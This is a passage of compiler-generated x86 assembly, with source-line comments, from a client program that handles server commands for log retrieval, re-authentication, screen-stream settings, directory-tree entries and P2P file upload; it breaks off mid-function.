	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.0006.client			;;; i71
caser.000E.0005.client:
	sub	esp,64			;;; i487
	mov	eax,[ebp+16]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.v			;;; i492a
	add	esp,64			;;; i600
	add	eax,200			;;; i775
	sub	eax,1			;;; i791
	push	eax			;;; i667a
	call	func1C.client			;;; i619
;
; [340] CASE "getslog"			:sessionlog$ = msg$: SendSMessage(idx,"getslog")
	jmp	end.select.000E.client			;;; i69
case.000E.0006.client:
	mov	eax,addr @_string.0130.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.0007.client			;;; i71
	mov	eax,[ebp+16]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %sessionlog$.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
	mov	eax,addr @_string.0130.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [341] CASE "getelog"			:ClearEditText ($$event)
	jmp	end.select.000E.client			;;; i69
case.000E.0007.client:
	mov	eax,addr @_string.0131.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.0008.client			;;; i71
	push	201			;;; i656a
	call	func1C.client			;;; i619
;
; [342] CPrint ($$event, "\r\n--- event log start ---\r\n")
	mov	eax,addr @_string.0132.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	201			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [343] eventlog$ = msg$: SendSMessage(idx,"getelog")
	mov	eax,[ebp+16]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %eventlog$.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
	mov	eax,addr @_string.0131.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [344] CASE "reauth"			:SendSMessage(idx,"AUTH "+ $$SR_AUTHPASS)
	jmp	end.select.000E.client			;;; i69
case.000E.0008.client:
	mov	eax,addr @_string.0133.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.0009.client			;;; i71
	mov	eax,addr @_string.0134.client			;;; i663
	mov	ebx,addr @_string.2D2E.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [345] '	CASE "."				:Shutdown ()
;
; [346] CASE "stron"			:#streamp = XLONG(msg$): IFZ #streamp THEN #streamp = $$SR_SPORT
	jmp	end.select.000E.client			;;; i69
case.000E.0009.client:
	mov	eax,addr @_string.0136.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.000A.client			;;; i71
data section 'globals$shared'
align	4
%#streamp.client:	db 4 dup ?
.code
	sub	esp,64			;;; i487
	mov	eax,[ebp+16]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.v			;;; i492a
	add	esp,64			;;; i600
	mov	d[%#streamp.client],eax			;;; i668
	mov	eax,d[%#streamp.client]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.000F.client			;;; i195
	mov	eax,6112			;;; i659
	mov	d[%#streamp.client],eax			;;; i668
else.000F.client:
end.if.000F.client:
;
; [347] IF !#hstream && (#stream == $$FALSE) THEN
data section 'globals$shared'
align	4
%#hstream.client:	db 4 dup ?
.code
	mov	eax,d[%#hstream.client]			;;; i663a
	neg	eax			;;; i888
	cmc				;;; i889
	rcr	eax,1			;;; i890
	sar	eax,31			;;; i891
data section 'globals$shared'
align	4
%#stream.client:	db 4 dup ?
.code
	mov	ebx,d[%#stream.client]			;;; i663a
	cmp	ebx,0			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.44			;;; i467
	not	ebx			;;; i468
A.44:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i220
	jz	>> else.0010.client			;;; i221
;
; [348] #hstream = _beginthreadex (NULL, 0, &streamscreen(), idx, 0, &tid)
	mov	eax,addr _streamscreen.client@4			;;; i599
	mov	d[ebp-52],eax			;;; i670
	lea	eax,[%39%tid.client]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	0			;;; i656a
	push	[ebp-64]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
	mov	d[%#hstream.client],eax			;;; i668
;
; [349] Sleep(20)
	push	20			;;; i656a
	call	_Sleep@4			;;; i619
;
; [350] END IF
else.0010.client:
end.if.0010.client:
;
; [351] CASE "stroff"			:#stream = $$FALSE
	jmp	end.select.000E.client			;;; i69
case.000E.000A.client:
	mov	eax,addr @_string.013B.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.000B.client			;;; i71
	mov	eax,0			;;; i659
	mov	d[%#stream.client],eax			;;; i668
;
; [352] Sleep (1000)
	push	1000			;;; i656a
	call	_Sleep@4			;;; i619
;
; [353] #hstream = 0
	mov	eax,0			;;; i659
	mov	d[%#hstream.client],eax			;;; i668
;
; [354] CASE "strp"				:#streamp = XLONG (msg$)
	jmp	end.select.000E.client			;;; i69
case.000E.000B.client:
	mov	eax,addr @_string.013D.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.000C.client			;;; i71
	sub	esp,64			;;; i487
	mov	eax,[ebp+16]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.v			;;; i492a
	add	esp,64			;;; i600
	mov	d[%#streamp.client],eax			;;; i668
;
; [355] CPrint ($$main,"*** stream port set to "+STRING$(#streamp))
	sub	esp,64			;;; i487
	mov	eax,d[%#streamp.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.013E.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [356] CASE "strq"				:#streamq = XLONG (msg$)
	jmp	end.select.000E.client			;;; i69
case.000E.000C.client:
	mov	eax,addr @_string.013F.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.000D.client			;;; i71
data section 'globals$shared'
align	4
%#streamq.client:	db 4 dup ?
.code
	sub	esp,64			;;; i487
	mov	eax,[ebp+16]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.v			;;; i492a
	add	esp,64			;;; i600
	mov	d[%#streamq.client],eax			;;; i668
;
; [357] CPrint ($$main,"*** stream quality set to "+STRING$(#streamq))
	sub	esp,64			;;; i487
	mov	eax,d[%#streamq.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0141.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [358] CASE "strt"				:#streamt = XLONG (msg$)
	jmp	end.select.000E.client			;;; i69
case.000E.000D.client:
	mov	eax,addr @_string.0142.client			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.000E.000E.client			;;; i71
data section 'globals$shared'
align	4
%#streamt.client:	db 4 dup ?
.code
	sub	esp,64			;;; i487
	mov	eax,[ebp+16]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.v			;;; i492a
	add	esp,64			;;; i600
	mov	d[%#streamt.client],eax			;;; i668
;
; [359] CPrint ($$main,"*** stream delay set to "+STRING$(#streamt))
	sub	esp,64			;;; i487
	mov	eax,d[%#streamt.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0144.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [360] CASE ELSE				:SendSMessage(idx,cmd$+" "+msg$)
	jmp	end.select.000E.client			;;; i69
case.000E.000E.client:
	mov	eax,[ebp+12]			;;; i665
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+16]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [361] END SELECT
end.select.000E.client:
;
; [363] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ProcessClientCmd.client:  ;;; Function end label for Assembly Programmers.
end.func39.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func39.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
free.func39.client:
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-60]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ProcessClientCmd ()  *****
;  *****
;
; [365] FUNCTION newTreeRootDir (STRING dir)
.code
;
#ifdef newTreeRootDir.dir
#undef newTreeRootDir.dir
#endif
#define newTreeRootDir.dir ebp+8	; exposes function argument 'dir'
;
align 16
_newTreeRootDir.client@4:
;  *****
;  *****  FUNCTION  newTreeRootDir ()  *****
;  *****
func5D.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody5D.client:
;
; [367] IFZ INSTRI(dir,":") THEN
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.0147.client			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_instri.vv			;;; i572
	add	esp,64			;;; i600
	test	eax,eax			;;; i194
	jnz	>> else.0011.client			;;; i195
;
; [368] CPrint ($$main,"* invalid path: "+dir)
	mov	eax,addr @_string.0148.client			;;; i663
	mov	ebx,[ebp+8]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [369] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func5D.client			;;; i258
;
; [370] END IF
else.0011.client:
end.if.0011.client:
;
; [371] IF RIGHT$(dir,1) != "\\" THEN dir = dir+"\\"
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	je	>> else.0012.client			;;; i219
	mov	eax,[ebp+8]			;;; i665
	mov	ebx,addr @_string.0149.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0012.client:
end.if.0012.client:
;
; [372] hItem = addToTree ("-1 "+dir)
#ifdef newTreeRootDir.hItem
#undef newTreeRootDir.hItem
#endif
#define newTreeRootDir.hItem ebp-40	; exposes local variable 'hItem'
;
	mov	eax,addr @_string.014B.client			;;; i663
	mov	ebx,[ebp+8]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	call	func4E.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
	mov	d[ebp-40],eax			;;; i670
;
; [373] setTreeChild (hItem)
	push	[ebp-40]			;;; i674a
	call	func56.client			;;; i619
;
; [374] SendSMessage(idx,"treeb "+STRING$(hItem)+" "+dir)
#ifdef newTreeRootDir.idx
#undef newTreeRootDir.idx
#endif
#define newTreeRootDir.idx ebp-44	; exposes local variable 'idx'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.014D.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp+8]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [376] RETURN 1
	mov	eax,1			;;; i659
	jmp	end.func5D.client			;;; i258
;
; [377] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.newTreeRootDir.client:  ;;; Function end label for Assembly Programmers.
end.func5D.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  newTreeRootDir ()  *****
;  *****
;
; [379] FUNCTION ClientUpload (ptext)' (STRING text)
.code
;
#ifdef ClientUpload.ptext
#undef ClientUpload.ptext
#endif
#define ClientUpload.ptext ebp+8	; exposes function argument 'ptext'
;
align 16
_ClientUpload.client@4:
;  *****
;  *****  FUNCTION  ClientUpload ()  *****
;  *****
func4A.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func4A.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.58:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.58			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,132			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,35				;;; ..
	xor	eax,eax			;;; ...
A.59:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.59			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+540]			;;; i125a
	lea	ecx,[esp+568]			;;; i125b
	lea	edx,[esp+1108]			;;; i125c
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-48],ebx			;;; i670
	mov	d[ebp-92],ecx			;;; i670
	mov	d[ebp-104],edx			;;; i670
funcBody4A.client:
;
; [380] TP2PFILE file
; .composites = ebp-40	; internal variable
#ifdef ClientUpload.file
#undef ClientUpload.file
#endif
#define ClientUpload.file ebp-44	; exposes local variable 'file'
;
;
; [381] TP2P p2p
#ifdef ClientUpload.p2p
#undef ClientUpload.p2p
#endif
#define ClientUpload.p2p ebp-48	; exposes local variable 'p2p'
;
;
; [382] STRING text
#ifdef ClientUpload.text
#undef ClientUpload.text
#endif
#define ClientUpload.text ebp-52	; exposes local variable 'text'
;
;
; [385] IF (WaitForSingleObject (#hsmUpL,30000) == $$WAIT_TIMEOUT) THEN
;
; [0] EXTERNAL FUNCTION WaitForSingleObject (hHandle, dwMilliseconds)
data section 'globals$shared'
align	4
%#hsmUpL.client:	db 4 dup ?
.code
	push	30000			;;; i656a
	push	[%#hsmUpL.client]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.0013.client			;;; i219
;
; [386] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func4A.client			;;; i258
;
; [387] END IF
else.0013.client:
end.if.0013.client:
;
; [388] text = CSTRING$(ptext)
	sub	esp,64			;;; i487
	mov	eax,d[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [390] IF newP2P(@p2p) THEN
;
; [0] EXTERNAL FUNCTION newP2P (TP2P)
	mov	eax,d[ebp-48]			;;; i665
	push	eax			;;; i667a
	call	_newP2P@4			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.0014.client			;;; i221
;
; [391] auths$ = GetTokenEx (@text,',',0)
#ifdef ClientUpload.auths$
#undef ClientUpload.auths$
#endif
#define ClientUpload.auths$ ebp-56	; exposes local variable 'auths$'
;
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [392] addr$ = GetTokenEx (@text,',',0)
#ifdef ClientUpload.addr$
#undef ClientUpload.addr$
#endif
#define ClientUpload.addr$ ebp-60	; exposes local variable 'addr$'
;
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	lea	ebx,[ebp-60]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [393] port = ULONG(GetTokenEx (@text,',',0))
#ifdef ClientUpload.port
#undef ClientUpload.port
#endif
#define ClientUpload.port ebp-64	; exposes local variable 'port'
;
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-64],eax			;;; i670
;
; [394] file.auth = @p2p.GetAdler(&auths$,LEN(auths$))
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.52			;;; i604
; .xstk4A.0000 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-56]			;;; i642
; .xstk4A.0001 = ebp-80	; internal variable
	mov	d[ebp-80],eax			;;; i670
	mov	eax,d[ebp-56]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.53			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.53:
	push	eax			;;; i667a
	push	[ebp-80]			;;; i674a
	mov	eax,d[ebp-72]			;;; i665
	call	eax			;;; i620
A.52:
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+3],eax			;;; i13b
;
; [395] file.srcfile = GetTokenEx (@text,',',0)
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	ebx,d[ebp-44]			;;; i665
	lea	edi,[ebx+7]			;;; i9b
	mov	esi,eax			;;; i10
	mov	ecx,255			;;; i11
	call	%_assignCompositeStringlet.s			;;; i12
;
; [396] file.desfile = GetTokenEx (@text,',',0)
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	ebx,d[ebp-44]			;;; i665
	lea	edi,[ebx+262]			;;; i9b
	mov	esi,eax			;;; i10
	mov	ecx,255			;;; i11
	call	%_assignCompositeStringlet.s			;;; i12
;
; [397] file.start = ULONG(GetTokenEx (@text,',',0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+517],eax			;;; i13b
;
; [398] file.end = ULONG(GetTokenEx (@text,',',0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+521],eax			;;; i13b
;
; [399] file.flags = ULONG(GetTokenEx (@text,0,0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	call	func42.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	b[ebx+538],al			;;; i13b
;
; [400] file.blocks = 0'use default block size
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+533],ebx			;;; i13b
;
; [402] CPrint ($$main,"* uploading file "+file.srcfile)
	mov	eax,d[ebp-44]			;;; i665
	lea	esi,[eax+7]			;;; i308
	mov	edi,255			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	ebx,addr @_string.0161.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [403] SendSMessage (idx,"listen "+STRING$(file.auth)+","+STRING$(port))
#ifdef ClientUpload.idx
#undef ClientUpload.idx
#endif
#define ClientUpload.idx ebp-84	; exposes local variable 'idx'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+3]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_string.ulong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0163.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-72],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[ebp-64]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-72]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-84]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [404] Sleep (200)
	push	200			;;; i656a
	call	_Sleep@4			;;; i619
;
; [406] ret = @p2p.FileUpload (file,addr$,port)
#ifdef ClientUpload.ret
#undef ClientUpload.ret
#endif
#define ClientUpload.ret ebp-88	; exposes local variable 'ret'
;
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+8]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.54			;;; i604
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i665
; .compositeArg.0 = ebp-92	; internal variable
	mov	edi,d[ebp-92]			;;; i665
	mov	esi,eax			;;; i660
	mov	ecx,540			;;; i606a
	mov	eax,edi			;;; i606b
	call	%_assignComposite			;;; i607
	mov	d[ebp-80],eax			;;; i670
	mov	eax,d[ebp-60]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk4A.0002 = ebp-100	; internal variable
	mov	d[ebp-100],eax			;;; i670
	push	[ebp-64]			;;; i674a
	push	[ebp-100]			;;; i674a
	push	[ebp-80]			;;; i674a
	mov	eax,d[ebp-72]			;;; i665
	call	eax			;;; i620
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
A.54:
	mov	d[ebp-88],eax			;;; i670
;
; [407] @p2p.Free(p2p)
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+20]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.55			;;; i604
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
; .compositeArg.1 = ebp-104	; internal variable
	mov	edi,d[ebp-104]			;;; i665
	mov	esi,eax			;;; i660
	mov	ecx,28			;;; i606a
	mov	eax,edi			;;; i606b
	call	%_assignComposite			;;; i607
	push	eax			;;; i667a
